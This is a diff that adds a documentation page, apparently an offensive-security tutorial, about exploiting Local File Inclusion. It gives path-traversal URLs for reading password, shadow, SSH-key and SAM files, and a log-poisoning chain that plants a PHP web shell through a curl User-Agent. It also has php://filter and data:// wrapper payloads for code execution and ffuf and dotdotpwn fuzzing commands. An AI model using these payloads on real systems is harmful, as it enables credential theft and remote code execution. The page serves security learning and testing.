@@ -1,0 +1,95 @@
+---
+title: "Local File Inclusion"
+description: "Exploit LFI vulnerabilities to read files, leak credentials, and achieve remote code execution."
+---
+
+Local File Inclusion (LFI) occurs when a web application includes files based on **user-supplied input** without proper validation, allowing an attacker to read arbitrary files on the server.
+
+## Identifying LFI
+
+Look for parameters that reference files:
+
+```
+http://target.com/page?file=about
+http://target.com/index.php?lang=en
+http://target.com/view?page=contact
+```
+
+## Basic Exploitation
+
+```bash
+# Direct path traversal
+http://target.com/page?file=../../../../etc/passwd
+
+# URL encoded
+http://target.com/page?file=..%2F..%2F..%2Fetc%2Fpasswd
+
+# Null byte bypass (PHP < 5.3.4)
+http://target.com/page?file=../../../../etc/passwd%00
+```
+
+## Interesting Files to Read
+
+<Tabs>
+  <Tab title="Linux">
+    ```
+    /etc/passwd
+    /etc/shadow
+    /etc/hosts
+    /etc/crontab
+    /home/<user>/.ssh/id_rsa
+    /var/log/apache2/access.log
+    /var/log/auth.log
+    /proc/self/environ
+    /proc/self/cmdline
+    ```
+  </Tab>
+  <Tab title="Windows">
+    ```
+    C:\Windows\System32\drivers\etc\hosts
+    C:\Windows\win.ini
+    C:\Windows\System32\config\SAM
+    C:\inetpub\logs\LogFiles\
+    C:\xampp\apache\logs\access.log
+    ```
+  </Tab>
+</Tabs>
+
+## Log Poisoning → RCE
+
+If you can read log files, you may be able to inject PHP code into them.
+
+```bash
+# 1. Inject malicious User-Agent into Apache logs
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com
+
+# 2. Include the log file and pass your command
+http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id
+```
+
+## PHP Wrappers
+
+```bash
+# Read PHP source code (base64 encoded)
+http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
+
+# Decode the output
+echo "BASE64_OUTPUT" | base64 -d
+
+# RCE via data wrapper (requires allow_url_include=On)
+http://target.com/page?file=data://text/plain,<?php+system('id');?>
+```
+
+<Warning>
+  Log poisoning requires the web server user to have read access to the log files, and the log path must be discoverable.
+</Warning>
+
+## Wordlists & Tools
+
+```bash
+# LFI fuzzing with ffuf
+ffuf -u "http://target.com/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+# dotdotpwn
+dotdotpwn -m http -h target.com -U "/page?file=TRAVERSAL" -k "root"
+```
